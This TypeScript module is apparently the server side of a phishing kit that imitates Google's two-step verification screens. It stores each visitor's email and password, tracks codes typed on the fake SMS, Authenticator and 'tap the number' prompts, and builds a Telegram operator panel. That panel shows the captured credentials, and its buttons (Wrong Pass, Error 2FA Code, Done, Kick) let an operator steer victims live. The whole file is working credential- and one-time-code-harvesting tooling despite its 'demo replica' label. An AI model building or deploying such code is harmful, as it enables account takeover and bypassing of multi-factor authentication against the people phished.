/**
 * lib/twofa.ts
 * Server-side state for the two-step verification screens and the Telegram
 * operator panel (inline keyboard + /verify command).
 *
 * Everything lives in memory: one Map keyed by the visitor session id
 * (hv_<base36>_<hex>, see lib/session.ts). Restarting the server clears it,
 * which is exactly what a demo replica needs — no database, no cookie.
 */

import { getTelegramConfig, type TelegramConfig } from "./telegram";

/* --------------------------------------------------------------- types */

export type TwoFaStatus =
  | "pending" // password submitted, waiting for the operator
  | "tap" // "Check your Google Pixel 9 Pro" — tap the number
  | "authenticator" // "Get a verification code from the Google Authenticator app"
  | "sms" // "Get a verification code" — phone / WhatsApp / email
  | "checking" // visitor submitted a code — waiting for the operator's verdict
  | "approved" // operator pressed Done
  | "wrong_pass" // operator pressed Wrong Pass
  | "wrong_email" // operator pressed Wrong Email
  | "kicked" // operator pressed Kick — visitor is sent back to the start
  | "sso"; // operator pressed SSO

export type TwoFaChannel = "phone" | "whatsapp" | "email";

/** Which code form the visitor is on — used to restore it after an error. */
export type TwoFaEntry = "authenticator" | "sms";

export type TwoFaState = {
  session: string;
  email: string;
  /** password submitted on the password step — shown to the operator only */
  password: string;
  status: TwoFaStatus;
  channel: TwoFaChannel;
  /** two digits shown on the "tap the number" screen */
  tapCode: string;
  /** code the visitor has to type on the SMS screen (set by the operator) */
  smsCode: string | null;
  /** last two digits of the masked phone number */
  phoneTail: string;
  /** set when the visitor pressed "Send" on the SMS screen */
  codeSentAt: number | null;
  /** how many times the visitor typed a wrong SMS code */
  attempts: number;
  /** code form the visitor last used, so "Error 2FA Code" can return there */
  entry: TwoFaEntry;
  /** last code the visitor typed (shown to the operator only) */
  submittedCode: string | null;
  /** phone number the visitor typed before pressing "Send" */
  submittedPhone: string | null;
  /** operator-requested message under the field ("Wrong code. Try again.") */
  errorNote: string | null;
  /** id of the operator panel message, so each click can refresh it in place */
  messageId: number | null;
  updatedAt: number;
};

/** What the browser is allowed to see (no smsCode — the check is server-side). */
export type TwoFaPublic = {
  session: string;
  status: TwoFaStatus;
  channel: TwoFaChannel;
  tapCode: string;
  phoneTail: string;
  codeSentAt: number | null;
  attempts: number;
  entry: TwoFaEntry;
  errorNote: string | null;
  updatedAt: number;
  /** false when no bot token / chat id is configured (demo mode) */
  configured: boolean;
  /** last Telegram error, only useful for the operator */
  telegramError: string | null;
};

/* --------------------------------------------------------------- store */

const TTL_MS = 30 * 60 * 1000;
const states = new Map<string, TwoFaState>();

export function isValidSessionId(id: unknown): id is string {
  return typeof id === "string" && /^hv_[0-9a-z]{1,16}_[0-9a-f]{16}$/.test(id);
}

function twoDigits(): string {
  return String(Math.floor(Math.random() * 90) + 10);
}

function prune(): void {
  const now = Date.now();
  for (const [key, value] of states) {
    if (now - value.updatedAt > TTL_MS) states.delete(key);
  }
}

export function getState(session: string): TwoFaState | null {
  prune();
  return states.get(session) ?? null;
}

export function ensureState(session: string, email: string, password = ""): TwoFaState {
  const existing = states.get(session);
  const now = Date.now();
  if (existing) {
    if (email) existing.email = email;
    if (password) existing.password = password;
    existing.updatedAt = now;
    return existing;
  }
  const fresh: TwoFaState = {
    session,
    email,
    password,
    status: "tap",
    channel: "phone",
    tapCode: twoDigits(),
    smsCode: null,
    phoneTail: "69",
    codeSentAt: null,
    attempts: 0,
    entry: "authenticator",
    submittedCode: null,
    submittedPhone: null,
    errorNote: null,
    messageId: null,
    updatedAt: now,
  };
  states.set(session, fresh);
  return fresh;
}

/**
 * Restarts the flow after a password submission. The visitor stays on the
 * spinner until the operator sends the first instruction (tap prompt, SMS /
 * WhatsApp / email code screen, or any verdict).
 */
export function resetState(session: string, email: string, password = ""): TwoFaState {
  const fresh = ensureState(session, email, password);
  fresh.status = "pending";
  fresh.channel = "phone";
  fresh.tapCode = twoDigits();
  fresh.smsCode = null;
  fresh.codeSentAt = null;
  fresh.attempts = 0;
  fresh.entry = "authenticator";
  fresh.submittedCode = null;
  fresh.submittedPhone = null;
  fresh.errorNote = null;
  fresh.updatedAt = Date.now();
  return fresh;
}

export function patchState(
  session: string,
  patch: Partial<Omit<TwoFaState, "session" | "updatedAt">>,
): TwoFaState | null {
  const state = states.get(session);
  if (!state) return null;
  Object.assign(state, patch);
  state.updatedAt = Date.now();
  return state;
}

/** Most recently touched session — lets "/verify 31" work without an id. */
export function latestSession(): string | null {
  let best: TwoFaState | null = null;
  for (const state of states.values()) {
    if (!best || state.updatedAt > best.updatedAt) best = state;
  }
  return best?.session ?? null;
}

export function toPublic(state: TwoFaState): TwoFaPublic {
  return {
    session: state.session,
    status: state.status,
    channel: state.channel,
    tapCode: state.tapCode,
    phoneTail: state.phoneTail,
    codeSentAt: state.codeSentAt,
    attempts: state.attempts,
    entry: state.entry,
    errorNote: state.errorNote,
    updatedAt: state.updatedAt,
    configured: Boolean(serverTelegramConfig()),
    telegramError: lastTelegramError,
  };
}

/* ------------------------------------------------------------ telegram */

/** TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID win; the public ones are the fallback. */
export function serverTelegramConfig(): TelegramConfig | null {
  const token = (process.env.TELEGRAM_BOT_TOKEN ?? "").trim();
  const chatId = (process.env.TELEGRAM_CHAT_ID ?? "").trim();
  if (token && chatId) {
    const apiBase = (process.env.TELEGRAM_API_BASE ?? "https://api.telegram.org")
      .trim()
      .replace(/\/+$/, "");
    return { token, chatId, apiBase: apiBase || "https://api.telegram.org" };
  }
  return getTelegramConfig();
}

let lastTelegramError: string | null = null;

export function setTelegramError(message: string | null): void {
  lastTelegramError = message;
}

/* Operator panel buttons — same rows as the reference layout, one per step
   of the flow, plus a full-width Kick on the last row. */
type PanelButton = { text: string; action: string };

const PANEL_ROWS: PanelButton[][] = [
  [
    { text: "\u{1F510} 2FA Auth", action: "auth" },
    { text: "\u{1F4F1} 2FA Phone", action: "phone" },
  ],
  [
    { text: "\u{1F4AC} 2FA WhatsApp", action: "wa" },
    { text: "\u{1F4E7} 2FA Email", action: "email" },
  ],
  [
    { text: "\u{1F4F1} Device Verify", action: "device" },
    { text: "\u{1F4DE} Phone Verify", action: "pverify" },
  ],
  [
    { text: "\u26A0\uFE0F Error 2FA Code", action: "ecode" },
    { text: "\u26A0\uFE0F Error Phone SMS", action: "ephone" },
  ],
  [
    { text: "\u274C Wrong Pass", action: "wpass" },
    { text: "\u274C Wrong Email", action: "wemail" },
  ],
  [
    { text: "\u2705 Done", action: "done" },
    { text: "\u{1F510} SSO", action: "sso" },
  ],
  [{ text: "\u274C Kick", action: "kick" }],
];

/** callback_data is limited to 64 bytes: "a|tap|hv_xxxxxxxxx_0123456789abcdef". */
export function panelKeyboard(session: string) {
  return {
    inline_keyboard: PANEL_ROWS.map((row) =>
      row.map((button) => ({
        text: button.text,
        callback_data: "a|" + button.action + "|" + session,
      })),
    ),
  };
}

export const PANEL_ACTIONS: Record<string, string> = {
  auth: "authenticator",
  tap: "authenticator",
  device: "tap",
  ecode: "error_code",
  ephone: "error_phone",
  kick: "kicked",
  phone: "sms-phone",
  pverify: "sms-phone-entry",
  wa: "sms-whatsapp",
  email: "sms-email",
  wpass: "wrong_pass",
  wemail: "wrong_email",
  done: "approved",
  sso: "sso",
};

export const STATUS_LABEL: Record<TwoFaStatus, string> = {
  pending: "waiting",
  tap: "tap code",
  authenticator: "authenticator code",
  sms: "code screen",
  checking: "code received \u2014 waiting",
  approved: "approved",
  wrong_pass: "wrong password",
  wrong_email: "wrong email",
  kicked: "kicked",
  sso: "SSO",
};

function escape(value: string): string {
  return value.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

export function panelText(state: TwoFaState): string {
  // Deliberately just the credentials plus the commands: no status, tap code,
  // phone tail or "code sent" lines — what the visitor submits arrives as its
  // own notification message instead.
  const lines = [
    "<b>\u{1F510} 2-Step Verification</b>",
    "",
    "\u2022 Session: <code>" + escape(state.session) + "</code>",
    "\u2022 Email: <code>" + escape(state.email || "\u2014") + "</code>",
    "\u2022 Password: <code>" + escape(state.password || "\u2014") + "</code>",
    "",
    "<b>Commands</b>",
    "<code>/verify " + escape(state.session) + " 31</code> \u2014 show a code",
    "<code>/phone " + escape(state.session) + " 42</code> \u2014 last 2 digits of the phone number",
  ];
  return lines.join("\n").slice(0, 3900);
}
